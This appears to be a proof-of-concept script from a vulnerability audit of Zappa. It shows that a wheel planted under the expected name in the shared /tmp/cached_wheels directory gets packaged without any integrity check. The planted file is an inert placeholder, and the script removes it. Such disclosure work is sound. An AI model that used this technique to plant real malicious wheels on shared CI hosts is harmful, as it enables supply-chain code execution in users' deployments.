#!/usr/bin/env python3
"""VULN-013 — /tmp wheel-cache poisoning: a planted wheel is used with no integrity check.

Vulnerable code : targets/Zappa/zappa/core.py:840-856 (predictable world-writable cache + glob match + no hash)
Vulnerability   : CWE-427/CWE-377 (untrusted search path / insecure temp file) + CWE-494 (no integrity check).
Surface         : C (local co-tenant on the build/CI host) — on the DEFAULT deploy path.

Mechanism (plain English)
-------------------------
`get_cached_manylinux_wheel` uses a fixed, world-writable cache directory
`/tmp/cached_wheels` (`Path(tempfile.gettempdir()) / "cached_wheels"`, created
with `exist_ok=True`, no restrictive perms). If a file already matching
`{wheel_name}-{version}-*_{arch}.whl` (and the wheel regex) exists there, it is
returned and packaged into the Lambda zip **without any download or hash check**:

    for pathname in cached_wheels_dir.glob(wheel_file_pattern):
        if self.manylinux_wheel_file_match.match(str(pathname)):
            return pathname                    # trusted verbatim, no SHA verification

So a local co-tenant who pre-plants a malicious wheel with the right name gets
that code shipped to the Lambda (and executed on import) — cache poisoning on the
default packaging path.

What a successful run proves
----------------------------
A file planted in `/tmp/cached_wheels` with the expected name is returned by the
real `get_cached_manylinux_wheel` with no download — the "Using locally cached
manylinux wheel" path — i.e. the poisoned artifact wins.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-013"

_DRIVER = r"""
import json, os, secrets, tempfile
from zappa.core import Zappa, build_manylinux_wheel_file_match_pattern
sfx = secrets.token_hex(4)
z = Zappa.__new__(Zappa)                       # bypass __init__; set only what the method reads
z.architecture = "x86_64"
z.manylinux_wheel_file_match = build_manylinux_wheel_file_match_pattern("python3.12", "x86_64")

cache = os.path.join(tempfile.gettempdir(), "cached_wheels")
os.makedirs(cache, exist_ok=True)              # the same world-writable dir Zappa uses (exist_ok=True)
pkg = "evilpkg%s" % sfx
planted = os.path.join(cache, "%s-1.0-cp312-cp312-manylinux_2_17_x86_64.whl" % pkg)
with open(planted, "wb") as f:
    f.write(b"PK\x03\x04" + b"MALICIOUS_WHEEL_PLANTED_BY_COTENANT")   # arbitrary content, correct name

got = z.get_cached_manylinux_wheel(pkg, "1.0", disable_progress=True)   # <-- REAL target code
used_planted = (str(got) == planted)
os.remove(planted)
print(json.dumps({"planted": planted, "returned": str(got), "used_planted": used_planted}))
"""


def main():
    banner(VULN, "/tmp wheel-cache poisoning (planted wheel used, no hash check)",
           "zappa/core.py:840-856 get_cached_manylinux_wheel")

    log("SETUP", "planting a malicious wheel with the expected name in /tmp/cached_wheels (co-tenant)")
    log("STEP", "calling the real get_cached_manylinux_wheel — it should return the planted file, no download")
    cp = lab_python(_DRIVER)
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    log("INFO", f"planted : {res['planted']}")
    log("INFO", f"returned: {res['returned']}")

    if res["used_planted"]:
        log("PROOF", "get_cached_manylinux_wheel returned the attacker-planted wheel from the world-writable "
                     "/tmp/cached_wheels with no download and no SHA/integrity check — a local co-tenant's "
                     "malicious wheel is packaged into the Lambda and runs at import (cache poisoning -> RCE).")
        log("OK", "exploit confirmed — poisoned wheel accepted from the shared cache")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — planted /tmp/cached_wheels wheel used verbatim (no integrity check)")
        return 0
    log("FAIL", f"used_planted={res['used_planted']}")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
